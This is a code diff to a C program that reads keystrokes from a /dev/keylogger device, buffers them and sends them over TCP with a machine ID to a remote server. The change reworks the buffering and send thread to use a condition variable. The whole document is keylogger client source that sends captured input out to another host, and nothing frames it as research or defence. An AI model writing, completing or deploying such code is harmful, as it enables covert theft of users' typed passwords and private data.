@@ -11,70 +11,64 @@
 #define SMALL_BUFFER_SIZE 32
 #define BIG_BUFFER_SIZE 128
 
-int isRunning = 1;
-int machineId = -1;
-unsigned int interval = 3;
-unsigned int bigInterval = 10;
-char toSendBuffer[BIG_BUFFER_SIZE];
-int toSendBufferSize = 0;
-pthread_mutex_t toSendBufferMutex = PTHREAD_MUTEX_INITIALIZER;
-
-struct sockaddr_in addr;
-int connectionfd = -1;
-pthread_t connectionThread;
-
-void* connectionThreadWorker(void* nothing)
-{
-    while (isRunning)
-    {
-        // wait, until big buffer empty TODO
-        while(toSendBufferSize == 0) {sleep(1);}
-
-
-
-
-
-        while(isRunning)
-        {
-            connectionfd = socket(AF_INET, SOCK_STREAM, 0);
-            // try to connect
-            while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
-                fprintf(stderr, "Can't connect, retrying in %u seconds...\n", interval);
-                sleep(interval);
-            }
-            // lock bigbuffer
-            int status = 0;    // 0 -> not ok, 1 -> ok
-            pthread_mutex_lock(&toSendBufferMutex);
-            // send data TODO errors
-            status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
-            // set size to 0
-            if (status)
-            {
-                toSendBufferSize = 0;
-            }
-            // unlock bigbuffer
-            pthread_mutex_unlock(&toSendBufferMutex);
-            close(connectionfd);
-            // if successfully:
-            if (status)
-            {
-                //   notify that bigbuffer have enough space for one small buffer TODO
-
-
-                //   break
-                break;
-            }
-            else sleep(bigInterval);
-            // else: wait some time
-        }
-    }
-}
-
 char smallBuffer[SMALL_BUFFER_SIZE];
 int smallBufferSize = 0;
 
-int dev_fd = -1;
-int totalRead = 0;
+char toSendBuffer[BIG_BUFFER_SIZE];
+int toSendBufferSize = 0;
+
+int machineId = -1;
+
+unsigned int interval = 3;
+unsigned int bigInterval = 10;
+
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
+
+pthread_t connectionThread;
+
+struct sockaddr_in addr;
+
+
+void* connectionThreadWorker(void* nothing)
+{
+    int connectionfd = -1;
+    while (1)
+    {
+        pthread_mutex_lock(&mutex);
+        // wait until big buffer is empty
+        if (toSendBufferSize == 0)
+        {
+            printf("Big buffer empty, nothing to send - hanging...\n");
+            pthread_cond_wait(&cond, &mutex);
+        }
+        pthread_mutex_unlock(&mutex);
+
+        connectionfd = socket(AF_INET, SOCK_STREAM, 0);
+        // try to connect
+        while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1)
+        {
+            fprintf(stderr, "Can't connect, retrying in %u seconds...\n", interval);
+            sleep(interval);
+        }
+
+        // 0 -> not ok, 1 -> ok
+        int status = 0;
+        pthread_mutex_lock(&mutex);
+
+        // send data
+        status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
+        // set size to 0
+        if (status)
+        {
+            toSendBufferSize = 0;
+            pthread_cond_signal(&cond);
+        }
+
+        pthread_mutex_unlock(&mutex);
+        close(connectionfd);
+    }
+}
 
 int main(int argc, char *argv[])
 {
@@ -93,6 +87,7 @@ int main(int argc, char *argv[])
     // read computer id TODO
 
     // open device
+    int dev_fd = -1;
     if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
     {
         fprintf(stderr, "Cannot open device\n");
@@ -106,10 +101,11 @@ int main(int argc, char *argv[])
         return 3;
     }
 
+    int totalRead = 0;
     while (1)
     {
         int readBytes;
-        if ((readBytes = read(dev_fd, smallBuffer+smallBufferSize, SMALL_BUFFER_SIZE-smallBufferSize)) == -1)
+        if ((readBytes = read(dev_fd, smallBuffer + smallBufferSize, SMALL_BUFFER_SIZE - smallBufferSize)) == -1)
         {
             fprintf(stderr, "Error reading device\n");
             close(dev_fd);
@@ -122,17 +118,24 @@ int main(int argc, char *argv[])
 
         if (smallBufferSize == SMALL_BUFFER_SIZE)
         {
-            // wait until big buffer does not have space for one full small buffer TODO
+            pthread_mutex_lock(&mutex);
 
-            pthread_mutex_lock(&toSendBufferMutex);
+            // wait until big buffer have space for full small buffer
+            if (BIG_BUFFER_SIZE - toSendBufferSize < SMALL_BUFFER_SIZE)
+            {
+                printf("Not enouch space in big buffer - hanging...\n");
+                pthread_cond_wait(&cond, &mutex);
+            }
+
             // copy to big buffer
-            memcpy(toSendBuffer+toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
+            memcpy(toSendBuffer + toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
             toSendBufferSize += SMALL_BUFFER_SIZE;
-            // notify, that big buffer is not empty TODO
-
-
-            pthread_mutex_unlock(&toSendBufferMutex);
             smallBufferSize = 0;
+
+            // notify, that big buffer is not empty
+            pthread_cond_signal(&cond);
+
+            pthread_mutex_unlock(&mutex);
         }
     }
 }
